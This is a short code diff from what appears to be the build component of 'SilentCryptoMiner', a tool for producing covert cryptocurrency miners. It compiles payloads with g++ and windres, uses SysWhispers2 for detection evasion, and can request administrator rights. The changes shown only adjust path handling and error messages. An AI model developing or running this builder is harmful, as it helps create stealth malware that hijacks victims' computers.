@@ -22,19 +22,20 @@ namespace SilentCryptoMiner
                 string currentDirectory = Path.GetDirectoryName(savePath);
                 string filename = Path.GetFileNameWithoutExtension(savePath);
                 var paths = new Dictionary<string, string>() {
-                    { "current", currentDirectory },
-                    { "windres",  @"UCompilers\gcc\bin\windres.exe" },
-                    { "windreslog",  @"UCompilers\logs\windres.log" },
-                    { "g++",  @"UCompilers\gcc\bin\g++.exe" },
-                    { "g++log",  @"UCompilers\logs\g++.log" },
-                    { "syswhispers2",  @"UCompilers\SysWhispers2\SysWhispers2.exe" },
-                    { "syswhispers2log",  @"UCompilers\logs\SysWhispers2.log" },
+                    { "windres",  Path.Combine(currentDirectory, @"UCompilers\gcc\bin\windres.exe") },
+                    { "g++",  Path.Combine(currentDirectory, @"UCompilers\gcc\bin\g++.exe") },
+                    { "syswhispers2",  Path.Combine(currentDirectory, @"UCompilers\SysWhispers2\SysWhispers2.exe") },
+                    { "windreslog",  Path.Combine(currentDirectory, @"UCompilers\logs\windres.log") },
+                    { "g++log",  Path.Combine(currentDirectory, @"UCompilers\logs\g++.log") },
+                    { "syswhispers2log",  Path.Combine(currentDirectory, @"UCompilers\logs\SysWhispers2.log") },
                     { "manifest", Path.Combine(currentDirectory, "program.manifest") },
                     { "resource.rc", Path.Combine(currentDirectory, "resource.rc") },
                     { "resource.o", Path.Combine(currentDirectory, "resource.o") },
                     { "filename", Path.Combine(currentDirectory, filename) }
                 };
 
+                if (F.BuildError(currentDirectory.Contains(" "), string.Format("Error: Build path \"{0}\" contains a space in its path, spaces are not allowed in some of the compiler programs. Please choose another build location without a space in its path.", savePath)))
+                    return false;
                 var directoryFilter = F.CheckNonASCII(savePath);
                 if (F.BuildError(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following possible illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter))))
                     return false;
@@ -67,7 +68,7 @@ namespace SilentCryptoMiner
                 CreateManifest(paths["manifest"], requireAdministrator);
 
                 File.WriteAllText(paths["resource.rc"], resource.ToString());
-                RunExternalProgram("cmd", string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff {1}", paths["windres"], defs), currentDirectory, paths["windreslog"]);
+                RunExternalProgram(paths["windres"], string.Format("--input resource.rc --output resource.o -O coff {1}", paths["windres"], defs), currentDirectory, paths["windreslog"]);
                 File.Delete(paths["resource.rc"]);
                 File.Delete(paths["manifest"]);
                 if (F.BuildError(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
@@ -92,7 +93,7 @@ namespace SilentCryptoMiner
             }
             catch (Exception ex)
             {
-                MessageBox.Show("Error: An error occured while building the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show("Error: An error occured while compiling the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return false;
             }
             return true;
